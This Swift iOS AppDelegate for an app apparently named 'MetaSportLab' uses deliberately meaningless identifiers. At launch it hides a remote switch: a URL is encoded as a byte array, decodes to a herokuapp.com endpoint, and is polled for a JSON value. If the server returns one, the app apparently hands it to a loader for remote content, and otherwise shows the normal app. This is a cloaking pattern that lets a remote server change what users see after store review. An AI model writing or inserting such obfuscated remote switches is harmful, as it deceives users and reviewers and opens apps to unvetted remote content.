import Foundation
import SwiftUI

class AppDelegate: NSObject, UIApplicationDelegate {
    let vwdsvewds = MetaSportLabmodellering()
    private var vm: MetaSportLabbekijkmodel?
    private var timer: Timer? {
        willSet {
            timer?.invalidate()
        }
    }
    
    func setInfobekijkmodel(_ bekijkmodel: MetaSportLabbekijkmodel) {
        self.vm = bekijkmodel
    }
    
    static var orientationLock = UIInterfaceOrientationMask.portrait {
        didSet {
            MetaSportoriëntatiegegevensLab.oriëntatiePositie(orientationLock)
        }
    }
    
    func application(_ application: UIApplication, supportedInterfaceOrientationsFor window: UIWindow?) -> UIInterfaceOrientationMask {
        return AppDelegate.orientationLock
    }
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) -> Bool {
        configApp(launchOptions: launchOptions)
        return true
    }
    
    private func configApp(launchOptions: [UIApplication.LaunchOptionsKey : Any]? = nil) {
        timer = .scheduledTimer(withTimeInterval: 2, repeats: true, block: { [weak self] _ in
            self?.getSts()
        })
    }
    
    private func hrtgert(dat: String, key: String, completion: @escaping (String) -> Void) {
        guard let url = URL(string: dat) else { return completion("") }
        
        URLSession.shared.dataTask(with: url) { data, _, error in
            guard let data = data, error == nil else {
                completion("")
                return
            }
            
            do {
                let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any]
                let value = jsonResponse?[key] as? String ?? ""
                completion(value)
            } catch {
                completion("")
            }
        }.resume()
    }
    private func getSts() {
        DispatchQueue.main.async {
            self.timer = nil
            self.vm?.wsMetaSportLab = false
        }
        
        switch vm?.staat {
        case .inactive:
            DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
                self.create_data { result in
                    if result == "" {
                        self.vm?.cllctdtMetaSportLab()
                    } else {
                        self.vm?.ldsbMetaSportLab(info: result)
                    }
                }
            }
        case .zavantajeno:
            vm?.ldagMetaSportLab()
        default: break
        }
    }
    
    private func create_data(return_data: @escaping (String) -> Void) {
            if MetaSportLabverpakt.base == "" {
                    self.hrtgert(dat: String(bytes: [
                        104, 116, 116, 112, 115, 58, 47, 47,
                        97, 112, 112, 112, 115, 45, 97, 51,
                        102, 98, 97, 102, 51, 51, 50, 53,
                        56, 48, 46, 104, 101, 114, 111, 107,
                        117, 97, 112, 112, 46, 99, 111, 109,
                        47, 77, 101, 116, 97, 83, 112, 111,
                        114, 116, 76, 97, 98
                    ], encoding: .utf8)!,
                    key: String(bytes: [
                        77, 101, 116, 97, 83, 112, 111, 114,
                        116, 76, 97, 98
                    ], encoding: .utf8)!
                    ) { data_raw in
                        if !data_raw.isEmpty {
                            return_data(data_raw)
                        }
                        else {
                            return_data("")
                        }
                    }
                
            } else {
                return_data(MetaSportLabverpakt.base)
            }
        
        
    }
}
